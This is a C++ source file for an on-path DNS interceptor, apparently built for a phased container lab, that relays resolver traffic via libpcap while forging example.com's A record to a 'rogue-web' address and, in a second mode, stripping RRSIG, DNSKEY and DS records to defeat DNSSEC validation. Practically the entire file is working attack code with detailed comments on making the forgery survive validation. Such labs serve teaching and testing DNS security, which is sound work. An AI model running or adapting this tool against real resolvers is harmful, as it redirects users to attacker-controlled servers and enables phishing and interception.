/*
 * dns_interceptor.cpp — Phase 4 on-path DNS forger/stripper.
 *
 * Sits on the resolver subnet, same diversion mechanism as Phase 2/3:
 * core-router's one route sends every packet addressed to the resolver
 * (172.16.2.10) through this container instead of delivering it
 * directly. ip_forward is OFF here, so nothing reaches the resolver
 * unless this program explicitly relays it -- every captured packet is
 * retransmitted out the same interface, Ethernet destination corrected
 * to the resolver's real MAC (kept fresh by a background refresher;
 * see resolver_mac_refresher below).
 *
 * Two INDEPENDENT toggles, each a presence-of-file flag:
 *
 *   /tmp/forge.on  -- Phase 2/3 behavior, byte-for-byte unchanged: for
 *                     the final A answer to "example.com", overwrite
 *                     just the 4 RDATA bytes in place. Signatures (if
 *                     any) are left exactly as they were, which is
 *                     precisely why Phase 3's validating resolver
 *                     rejects it -- the forged data no longer matches
 *                     the untouched RRSIG.
 *
 *   /tmp/strip.on  -- Phase 4 addition. For ANY response whose
 *                     question name is "example.com" (any QTYPE --
 *                     this covers domain-ns's A answer, its DNSKEY
 *                     answer, and tld-ns's delegation/referral that
 *                     carries example.com's DS), remove every RRSIG
 *                     (type 46), DNSKEY (type 48), and DS (type 43)
 *                     record wherever it appears in the message, then
 *                     -- in the same pass, for the answer section only
 *                     -- overwrite any A record's RDATA with rogue-web's
 *                     address. The message is physically shortened
 *                     (RRs are removed, not blanked), so the DNS
 *                     header's an/ns/arcount, the UDP length, and the
 *                     IP total length all have to be recomputed to
 *                     match -- unlike forge mode, which never changes
 *                     the packet's length.
 *
 * The two modes can be toggled independently for Run A (strip only)
 * and are deliberately kept as separate code paths rather than one
 * merged mode: forge mode's in-place overwrite is exactly what Phase 2
 * and Phase 3 already graded, and strip mode's whole reason to exist is
 * that in-place overwriting alone doesn't fool a validating resolver.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
 * Usage: ./dns_interceptor <iface>
 *   RESOLVER_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value;
 *                refreshed automatically afterward).
 *   RESOLVER_IP  env var -- default "172.16.2.10".
 *   TARGET_NAME  env var -- default "example.com".
 *   ROGUE_IP     env var -- default "172.16.1.30".
 */

#include <array>
#include <cctype>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <optional>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <pcap.h>

namespace {

constexpr int ETH_HDR_LEN = 14;
constexpr const char *FORGE_FLAG_PATH = "/tmp/forge.on";
constexpr const char *STRIP_FLAG_PATH = "/tmp/strip.on";
constexpr size_t MAX_PACKET_SIZE = 2048;

constexpr uint16_t DNS_TYPE_A      = 1;
constexpr uint16_t DNS_TYPE_DS     = 43;
constexpr uint16_t DNS_TYPE_RRSIG  = 46;
constexpr uint16_t DNS_TYPE_DNSKEY = 48;

using MacAddr = std::array<uint8_t, 6>;

#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};
struct UdpHdr { uint16_t sport, dport, len, checksum; };
struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
#pragma pack(pop)

MacAddr     g_own_mac{};
std::mutex  g_resolver_mac_mu;
MacAddr     g_resolver_mac{};
std::string g_target_name = "example.com";
uint32_t    g_rogue_ip_net = 0;   // network byte order
pcap_t     *g_pcap = nullptr;

MacAddr get_resolver_mac() {
    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
    return g_resolver_mac;
}

void set_resolver_mac(const MacAddr &m) {
    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
    g_resolver_mac = m;
}

// ---------- helpers ----------

std::optional<MacAddr> parse_mac(const std::string &s) {
    unsigned int b[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6)
        return std::nullopt;
    MacAddr out{};
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
    return out;
}

std::optional<MacAddr> get_own_mac(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return std::nullopt; }
    MacAddr out{};
    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return out;
}

// Internet checksum (RFC 1071) over an array of 16-bit words already in
// network byte order: convert each to host order to sum, then convert
// the complemented sum back to network order for storage. This is the
// textbook formulation -- explicit at every step, no reliance on
// endianness symmetry tricks.
uint16_t checksum_words(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) sum += ntohs(buf[i]);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return htons(result == 0 ? 0xFFFF : result);
}

uint16_t ip_checksum(IpHdr ip /* by value: checksum field zeroed locally */) {
    ip.checksum = 0;
    return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
}

uint16_t udp_checksum(const IpHdr &ip, const UdpHdr &udp,
                       const uint8_t *payload, int paylen) {
    struct Pseudo {
        uint32_t src, dst;
        uint8_t  zero, proto;
        uint16_t udplen;
    } __attribute__((packed));

    int total = static_cast<int>(sizeof(Pseudo)) + ntohs(udp.len);
    int padded = (total + 1) & ~1; // even length for whole-word summing
    std::vector<uint8_t> buf(padded, 0);

    Pseudo ph{ip.src, ip.dst, 0, 17 /* UDP */, udp.len};
    std::memcpy(buf.data(), &ph, sizeof(ph));

    UdpHdr udp_copy = udp;
    udp_copy.checksum = 0;
    std::memcpy(buf.data() + sizeof(ph), &udp_copy, sizeof(udp_copy));

    if (paylen > 0)
        std::memcpy(buf.data() + sizeof(ph) + sizeof(udp_copy), payload, paylen);

    return checksum_words(reinterpret_cast<uint16_t *>(buf.data()), padded / 2);
}

// Skip one DNS name at buf+offset (compression pointer or ordinary
// labels). Returns bytes consumed, or -1 if malformed.
int dns_name_len(const uint8_t *buf, int offset, int buflen) {
    const int start = offset;
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if ((b & 0xC0) == 0xC0) {
            if (offset + 2 > buflen) return -1;
            return (offset - start) + 2;
        } else if (b == 0) {
            return (offset - start) + 1;
        } else if ((b & 0xC0) == 0) {
            if (offset + 1 + b > buflen) return -1;
            offset += 1 + b;
        } else {
            return -1;
        }
    }
    return -1;
}

// Decode the (uncompressed) question-section QNAME into a lowercase
// dotted string. Returns bytes consumed, or -1 on error.
int decode_qname(const uint8_t *buf, int offset, int buflen, std::string &out) {
    const int start = offset;
    out.clear();
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if (b == 0) { offset += 1; break; }
        if ((b & 0xC0) == 0xC0) return -1; // not expected in a question
        if (offset + 1 + b > buflen) return -1;
        if (!out.empty()) out += '.';
        for (int i = 0; i < b; i++)
            out += static_cast<char>(std::tolower(buf[offset + 1 + i]));
        offset += 1 + b;
    }
    return offset - start;
}

bool forging_is_on() {
    struct stat st;
    return stat(FORGE_FLAG_PATH, &st) == 0;
}

bool stripping_is_on() {
    struct stat st;
    return stat(STRIP_FLAG_PATH, &st) == 0;
}

// Re-resolve the resolver's current MAC via the kernel's neighbor
// table. Plain `ping` alone is not enough to force this: if the
// kernel's neighbor entry is STALE (pointing at a now-dead MAC after
// the resolver container was recreated), the NUD state machine tries
// re-confirming that *same old* MAC via unicast first and can sit on
// the stale entry for a while before it ever falls back to a fresh
// broadcast ARP request -- so a single ping's 1s timeout can return
// before the entry actually updates. `arping` sends a broadcast ARP
// request directly, bypassing that unicast-reconfirmation step, which
// is why entrypoint.sh's own initial priming already paired the two;
// this refresher does the same, just repeated for the life of the
// process instead of once at startup.
std::optional<MacAddr> resolve_resolver_mac(const std::string &iface,
                                             const std::string &resolver_ip) {
    std::string ping_cmd = "ping -c1 -W1 " + resolver_ip + " >/dev/null 2>&1";
    if (std::system(ping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }
    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + resolver_ip + " >/dev/null 2>&1";
    if (std::system(arping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }

    // Deliberately NOT "ip neigh show <ip> dev <iface>": filtering by
    // device drops the "dev <iface>" tokens from the printed line
    // (just "<ip> lladdr <mac> <state>", 4 fields), shifting the MAC
    // from $5 to $3. Matching entrypoint.sh's own unfiltered form
    // keeps the 5-field layout ("<ip> dev <iface> lladdr <mac>
    // <state>") that $5 actually expects.
    std::string cmd = "ip neigh show " + resolver_ip +
                       " 2>/dev/null | awk '{print $5}' | head -n1";
    FILE *fp = popen(cmd.c_str(), "r");
    if (!fp) return std::nullopt;
    char buf[64] = {0};
    char *line = fgets(buf, sizeof(buf), fp);
    pclose(fp);
    if (!line) return std::nullopt;
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    if (s.empty()) return std::nullopt;
    return parse_mac(s);
}

// Runs for the life of the process: keeps g_resolver_mac current so a
// resolver container restart/recreate (which can change its MAC)
// doesn't permanently blackhole every relayed frame at L2.
void resolver_mac_refresher(std::string iface, std::string resolver_ip) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        auto mac = resolve_resolver_mac(iface, resolver_ip);
        if (!mac) continue;
        if (*mac != get_resolver_mac()) {
            char hex[32];
            snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
                     (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
            fprintf(stderr, "[attacker] resolver MAC changed -> %s\n", hex);
            set_resolver_mac(*mac);
        }
    }
}

// ---------- strip-mode RR filtering ----------

constexpr uint16_t DNS_TYPE_NS    = 2;
constexpr uint16_t DNS_TYPE_CNAME = 5;
constexpr uint16_t DNS_TYPE_SOA   = 6;
constexpr uint16_t DNS_TYPE_PTR   = 12;

// Fully expands a (possibly compressed) domain name at `offset` in the
// ORIGINAL message into its uncompressed wire form (labels verbatim,
// pointers followed and replaced by the labels they point to, ending
// in the root 0 byte), appending it to `out`. Returns the number of
// bytes consumed IN THE ORIGINAL MESSAGE starting at `offset` (same
// contract as dns_name_len: up to and including a pointer, 2 bytes,
// if one was followed), or -1 if malformed or a pointer loop is
// detected.
//
// Why this exists at all: a removed RRSIG's RDATA contains its
// zone's name written out in full (DNSSEC requires that field
// uncompressed) -- which makes it a perfectly legal compression
// target for any OTHER name in the same message that happens to need
// that same suffix (e.g. an NS record's rdata "host.example.com").
// Copying such a later record's bytes verbatim after deleting the
// RRSIG it secretly pointed into corrupts the message; decompressing
// every name into a self-contained form before writing it out removes
// the dependency entirely, regardless of what gets stripped around it.
int decompress_name_append(const uint8_t *dns_start, int offset, int dns_len,
                            std::vector<uint8_t> &out) {
    const int start = offset;
    bool following_pointer = false;
    int consumed_to_first_pointer = -1;
    int hops = 0;
    while (true) {
        if (offset < 0 || offset >= dns_len) return -1;
        const uint8_t b = dns_start[offset];
        if ((b & 0xC0) == 0xC0) {
            if (offset + 2 > dns_len) return -1;
            const int target = ((b & 0x3F) << 8) | dns_start[offset + 1];
            if (!following_pointer) consumed_to_first_pointer = (offset - start) + 2;
            if (++hops > 128) return -1; // pointer-loop guard
            offset = target;
            following_pointer = true;
            continue;
        } else if (b == 0) {
            out.push_back(0);
            return following_pointer ? consumed_to_first_pointer : (offset - start + 1);
        } else if ((b & 0xC0) == 0) {
            if (offset + 1 + b > dns_len) return -1;
            out.insert(out.end(), dns_start + offset, dns_start + offset + 1 + b);
            offset += 1 + b;
        } else {
            return -1;
        }
    }
}

// Writes the (possibly re-expanded) RDATA for one kept record into
// `out`, given its original bytes. For record types whose RDATA
// itself contains a domain name that could be compressed (NS/CNAME/
// PTR: one name; SOA: two names followed by five 32-bit fields),
// that name is decompressed the same way the owner name is. Every
// other type (A, OPT, and anything else we don't specifically
// recognize) is copied byte-for-byte -- safe, because none of the
// types this interceptor ever sees in practice (A, OPT) embed a
// compressible name in their RDATA. Returns false on a parse failure.
bool append_rdata(const uint8_t *dns_start, int rdata_off, uint16_t rdlen, int dns_len,
                   uint16_t rtype, std::vector<uint8_t> &out) {
    if (rtype == DNS_TYPE_NS || rtype == DNS_TYPE_CNAME || rtype == DNS_TYPE_PTR) {
        std::vector<uint8_t> name;
        if (decompress_name_append(dns_start, rdata_off, dns_len, name) < 0) return false;
        out.insert(out.end(), name.begin(), name.end());
        return true;
    }
    if (rtype == DNS_TYPE_SOA) {
        std::vector<uint8_t> mname, rname;
        const int mconsumed = decompress_name_append(dns_start, rdata_off, dns_len, mname);
        if (mconsumed < 0) return false;
        const int rname_off = rdata_off + mconsumed;
        const int rconsumed = decompress_name_append(dns_start, rname_off, dns_len, rname);
        if (rconsumed < 0) return false;
        const int tail_off = rname_off + rconsumed;
        if (tail_off + 20 > dns_len) return false; // serial/refresh/retry/expire/minimum
        out.insert(out.end(), mname.begin(), mname.end());
        out.insert(out.end(), rname.begin(), rname.end());
        out.insert(out.end(), dns_start + tail_off, dns_start + tail_off + 20);
        return true;
    }
    // Opaque RDATA (A, OPT, ...): copy verbatim, no names inside to fix up.
    if (rdata_off + static_cast<int>(rdlen) > dns_len) return false;
    out.insert(out.end(), dns_start + rdata_off, dns_start + rdata_off + rdlen);
    return true;
}

// Walks `count` resource records starting at `offset` in the original
// message (dns_start/dns_len), appending every record EXCEPT RRSIG/
// DNSKEY/DS to `out` with both its owner name and (where applicable)
// any name embedded in its RDATA fully decompressed -- except that,
// when `forge_answers` is set (answer section of a response whose
// question is the target name), any A record's RDATA is overwritten
// with the rogue IP as it's appended. Returns {new record count, next
// offset in the ORIGINAL message, success}; on any parse failure the
// caller aborts the strip and falls back to relaying the packet
// completely unmodified, so a malformed/unexpected message never gets
// corrupted further.
struct SectionResult { int new_count; int next_offset; bool ok; };

SectionResult strip_copy_section(const uint8_t *dns_start, int offset, int count, int dns_len,
                                  std::vector<uint8_t> &out, bool forge_answers,
                                  bool &forged_once, const std::string &qname_lower,
                                  uint16_t txid) {
    int kept = 0;
    for (int i = 0; i < count; i++) {
        const int nlen = dns_name_len(dns_start, offset, dns_len);
        if (nlen < 0) return {kept, offset, false};
        const int rhdr = offset + nlen;
        if (rhdr + 10 > dns_len) return {kept, offset, false};
        const uint16_t rtype  = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
        const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
        const uint16_t rdlen  = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
        const int rdata_off = rhdr + 10;
        if (rdata_off + static_cast<int>(rdlen) > dns_len) return {kept, offset, false};
        const int rr_total = nlen + 10 + static_cast<int>(rdlen);

        // RRSIG's RDATA starts with a 2-byte Type Covered field -- only
        // strip signatures over A or DS records (the two that matter
        // for forging example.com's answer and, in Run A, its parent
        // delegation). Crucially this does NOT strip an RRSIG covering
        // SOA/NSEC: that's com's own legitimate, validly-signed proof
        // that no DS exists for example.com (Run B's setup produces
        // this automatically), and com is itself a securely-validated
        // zone -- ripping that signature out doesn't make example.com
        // look unsigned, it makes com's own authoritative response look
        // tampered, which fails validation for an unrelated reason and
        // defeats the point of Run B entirely.
        bool strip_this = (rtype == DNS_TYPE_DNSKEY || rtype == DNS_TYPE_DS);
        if (rtype == DNS_TYPE_RRSIG && rdlen >= 2) {
            const uint16_t type_covered = (dns_start[rdata_off] << 8) | dns_start[rdata_off + 1];
            strip_this = (type_covered == DNS_TYPE_A || type_covered == DNS_TYPE_DS);
        }
        if (strip_this) {
            fprintf(stderr, "[strip] removed type=%u owner=%s (txid 0x%04x)\n",
                    rtype, qname_lower.c_str(), ntohs(txid));
        } else {
            std::vector<uint8_t> owner;
            if (decompress_name_append(dns_start, offset, dns_len, owner) < 0) return {kept, offset, false};
            std::vector<uint8_t> rdata;
            if (!append_rdata(dns_start, rdata_off, rdlen, dns_len, rtype, rdata)) return {kept, offset, false};

            out.insert(out.end(), owner.begin(), owner.end());
            uint16_t type_n = htons(rtype), class_n = htons(rclass);
            uint32_t ttl_n; std::memcpy(&ttl_n, dns_start + rhdr + 4, 4); // already network order
            uint16_t newlen_n = htons(static_cast<uint16_t>(rdata.size()));
            out.insert(out.end(), reinterpret_cast<uint8_t*>(&type_n), reinterpret_cast<uint8_t*>(&type_n) + 2);
            out.insert(out.end(), reinterpret_cast<uint8_t*>(&class_n), reinterpret_cast<uint8_t*>(&class_n) + 2);
            out.insert(out.end(), reinterpret_cast<uint8_t*>(&ttl_n), reinterpret_cast<uint8_t*>(&ttl_n) + 4);
            out.insert(out.end(), reinterpret_cast<uint8_t*>(&newlen_n), reinterpret_cast<uint8_t*>(&newlen_n) + 2);
            const size_t rdata_base = out.size();
            out.insert(out.end(), rdata.begin(), rdata.end());

            if (forge_answers && !forged_once && rtype == DNS_TYPE_A && rclass == 1 && rdata.size() == 4) {
                std::memcpy(out.data() + rdata_base, &g_rogue_ip_net, 4);
                forged_once = true;
                fprintf(stderr, "[strip+forge] %s A -> rogue-web (txid 0x%04x)\n",
                        qname_lower.c_str(), ntohs(txid));
            }
            kept++;
        }
        offset += rr_total;
    }
    return {kept, offset, true};
}

// Rebuilds the whole DNS message with DNSSEC RRs stripped and the
// target A record forged, writing the result back into `pkt` (which
// owns dns_start) and updating dns_len/caplen and the UDP/IP length
// fields to match the new, shorter message. Returns false (leaving
// pkt untouched) if anything about the message didn't parse as
// expected, so the caller just relays the original bytes instead.
bool strip_and_forge(uint8_t *pkt, int eth_ip_udp_hdr_len, uint8_t *dns_start, int &dns_len,
                      int &caplen, IpHdr *ip, UdpHdr *udp, const std::string &qname_lower,
                      int qend /* offset right after the question section */) {
    const auto *dns = reinterpret_cast<const DnsHdr *>(dns_start);
    const int ancount = ntohs(dns->ancount);
    const int nscount = ntohs(dns->nscount);
    const int arcount = ntohs(dns->arcount);
    const uint16_t txid = dns->id;

    std::vector<uint8_t> out;
    out.reserve(dns_len);
    out.insert(out.end(), dns_start, dns_start + qend); // header + question, verbatim for now

    bool forged_once = false;
    int offset = qend;

    auto an = strip_copy_section(dns_start, offset, ancount, dns_len, out, /*forge_answers=*/true, forged_once, qname_lower, txid);
    if (!an.ok) return false;
    offset = an.next_offset;

    auto ns = strip_copy_section(dns_start, offset, nscount, dns_len, out, false, forged_once, qname_lower, txid);
    if (!ns.ok) return false;
    offset = ns.next_offset;

    auto ar = strip_copy_section(dns_start, offset, arcount, dns_len, out, false, forged_once, qname_lower, txid);
    if (!ar.ok) return false;
    offset = ar.next_offset;

    if (offset != dns_len) return false; // trailing garbage we didn't account for -- bail safe

    // Patch the header counts in `out` (question count unchanged).
    auto *out_hdr = reinterpret_cast<DnsHdr *>(out.data());
    out_hdr->ancount = htons(static_cast<uint16_t>(an.new_count));
    out_hdr->nscount = htons(static_cast<uint16_t>(ns.new_count));
    out_hdr->arcount = htons(static_cast<uint16_t>(ar.new_count));

    const int new_dns_len = static_cast<int>(out.size());
    const int shrink = dns_len - new_dns_len;
    if (shrink < 0) return false; // stripping can only shrink the message, never grow it

    std::memcpy(dns_start, out.data(), out.size());
    dns_len -= shrink;
    caplen  -= shrink;
    ip->tot_len = htons(static_cast<uint16_t>(ntohs(ip->tot_len) - shrink));
    udp->len    = htons(static_cast<uint16_t>(ntohs(udp->len) - shrink));
    (void)eth_ip_udp_hdr_len;
    return true;
}

// ---------- per-packet handling ----------

void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
    const size_t min_len = ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr) + sizeof(DnsHdr);
    if (h->caplen < min_len || h->caplen > MAX_PACKET_SIZE) return;

    uint8_t pkt[MAX_PACKET_SIZE];
    std::memcpy(pkt, bytes, h->caplen);
    int caplen = static_cast<int>(h->caplen);

    auto *eth = reinterpret_cast<EthHdr *>(pkt);
    if (ntohs(eth->ethertype) != 0x0800) return; // IPv4 only

    auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
    const int ihl = (ip->ver_ihl & 0x0F) * 4;
    if (ip->proto != 17) return; // UDP only

    auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + ihl);
    uint8_t *dns_start = pkt + ETH_HDR_LEN + ihl + sizeof(UdpHdr);

    const int udp_declared_len = ntohs(udp->len);
    const int captured_avail   = caplen - static_cast<int>(ETH_HDR_LEN + ihl + sizeof(UdpHdr));
    int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
    if (dns_len < 0 || dns_len > captured_avail) dns_len = captured_avail;
    if (dns_len < static_cast<int>(sizeof(DnsHdr))) return;

    auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
    const uint16_t flags = ntohs(dns->flags);
    const bool qr = (flags >> 15) & 1;
    const int ancount = ntohs(dns->ancount);
    const int qdcount = ntohs(dns->qdcount);

    auto send_it = [&]() {
        const MacAddr resolver_mac = get_resolver_mac();
        std::memcpy(eth->dst, resolver_mac.data(), 6);
        std::memcpy(eth->src, g_own_mac.data(), 6);
        ip->checksum  = ip_checksum(*ip);
        udp->checksum = udp_checksum(*ip, *udp, dns_start, dns_len);
        pcap_inject(g_pcap, pkt, caplen);
    };

    if (!qr || qdcount < 1) { send_it(); return; }

    int off = sizeof(DnsHdr);
    std::string qname;
    const int namelen = decode_qname(dns_start, off, dns_len, qname);
    bool is_target = false;        // qname == target AND qtype == A (Phase 2/3 forge scope)
    bool qname_is_target = false;  // qname == target, any qtype (Phase 4 strip scope)
    int qend = -1;
    if (namelen > 0) {
        qname_is_target = (strcasecmp(qname.c_str(), g_target_name.c_str()) == 0);
        off += namelen;
        if (off + 4 <= dns_len) {
            const int qtype = (dns_start[off] << 8) | dns_start[off + 1];
            off += 4; // QTYPE + QCLASS
            qend = off;
            if (qtype == 1 /* A */ && qname_is_target) is_target = true;
        }
    }

    // Strip mode takes priority when enabled and in scope: it does its
    // own forging of the A record as part of the same rewrite, so the
    // separate in-place forge branch below is skipped for this packet.
    if (stripping_is_on() && qname_is_target && qend > 0) {
        if (strip_and_forge(pkt, ETH_HDR_LEN + ihl + static_cast<int>(sizeof(UdpHdr)),
                             dns_start, dns_len, caplen, ip, udp, qname, qend)) {
            send_it();
            return;
        }
        // Parse didn't match our assumptions -- fall through and relay
        // (or forge, below) the original packet rather than drop it.
    }

    if (is_target && ancount >= 1 && forging_is_on()) {
        int aoff = off;
        for (int i = 0; i < ancount && aoff < dns_len; i++) {
            const int nlen = dns_name_len(dns_start, aoff, dns_len);
            if (nlen < 0) break;
            const int rhdr = aoff + nlen;
            if (rhdr + 10 > dns_len) break;
            const uint16_t rtype  = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
            const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
            const uint16_t rdlen  = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
            const int rdata_off = rhdr + 10;
            if (rtype == 1 && rclass == 1 && rdlen == 4 && rdata_off + 4 <= dns_len) {
                std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
                fprintf(stderr, "[forge] %s A -> rogue-web (txid 0x%04x)\n", qname.c_str(), ntohs(dns->id));
                break;
            }
            aoff = rdata_off + rdlen;
        }
    }

    send_it();
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <iface>\n", argv[0]);
        return 1;
    }
    const std::string iface = argv[1];

    const char *mac_env = getenv("RESOLVER_MAC");
    if (!mac_env) {
        fprintf(stderr, "RESOLVER_MAC env var missing (expected aa:bb:cc:dd:ee:ff)\n");
        return 1;
    }
    auto resolver_mac = parse_mac(mac_env);
    if (!resolver_mac) {
        fprintf(stderr, "RESOLVER_MAC invalid: %s\n", mac_env);
        return 1;
    }
    set_resolver_mac(*resolver_mac);

    const char *resolver_ip_env = getenv("RESOLVER_IP");
    const std::string resolver_ip = resolver_ip_env ? resolver_ip_env : "172.16.2.10";

    auto own_mac = get_own_mac(iface);
    if (!own_mac) {
        fprintf(stderr, "could not read MAC of %s\n", iface.c_str());
        return 1;
    }
    g_own_mac = *own_mac;

    if (const char *target = getenv("TARGET_NAME")) g_target_name = target;

    const char *rogue = getenv("ROGUE_IP");
    if (!rogue) rogue = "172.16.1.30";
    struct in_addr a{};
    if (inet_aton(rogue, &a) == 0) {
        fprintf(stderr, "invalid ROGUE_IP %s\n", rogue);
        return 1;
    }
    g_rogue_ip_net = a.s_addr;

    char errbuf[PCAP_ERRBUF_SIZE];
    // A short (1ms) read timeout keeps our relay latency minimal -- a
    // longer timeout batches captured packets in the kernel ring
    // buffer before handing them to us, and that extra delay can be
    // enough for BIND's own query to have already timed out and moved
    // on to a fresh attempt (with a new transaction ID) by the time we
    // relay the answer to the one it already abandoned.
    g_pcap = pcap_open_live(iface.c_str(), 65535, 1 /*promisc*/, 1 /*ms*/, errbuf);
    if (!g_pcap) {
        fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf);
        return 1;
    }

    struct bpf_program fp;
    const std::string filter_str =
        "ip and udp and src port 53 and dst host " + resolver_ip;
    // optimize=0: skip libpcap's BPF optimizer. Some kernel/libpcap
    // combinations have had bugs where the optimizer miscompiles
    // compound filters like this one, causing it to match
    // inconsistently rather than failing outright or working cleanly.
    if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(g_pcap, &fp) < 0) {
        fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
        return 1;
    }
    pcap_freecode(&fp);

    std::thread refresher(resolver_mac_refresher, iface, resolver_ip);
    refresher.detach();

    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, resolver=%s, forging=%s, stripping=%s\n",
            iface.c_str(), g_target_name.c_str(), rogue, resolver_ip.c_str(),
            forging_is_on() ? "ON" : "OFF", stripping_is_on() ? "ON" : "OFF");

    pcap_loop(g_pcap, -1, handle_packet, nullptr);
    pcap_close(g_pcap);
    return 0;
}
